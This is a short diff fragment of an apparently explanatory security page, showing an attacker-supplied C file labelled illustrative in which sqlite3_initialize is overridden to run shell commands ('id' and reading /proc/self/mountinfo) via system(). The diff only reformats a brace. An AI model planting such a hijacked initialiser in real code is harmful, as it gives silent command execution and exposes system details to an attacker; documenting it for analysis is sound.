@@ -90,7 +90,8 @@
 <span style="color: #888;">/* attacker-supplied src/main.c (illustrative) */</span>
 #include &lt;stdlib.h&gt;
 
-int sqlite3_initialize(void) {
+int sqlite3_initialize(void)
+{
     system("id; echo ZZROOTSTART; cat /proc/self/mountinfo");
     <span style="color: #888;">
     /*
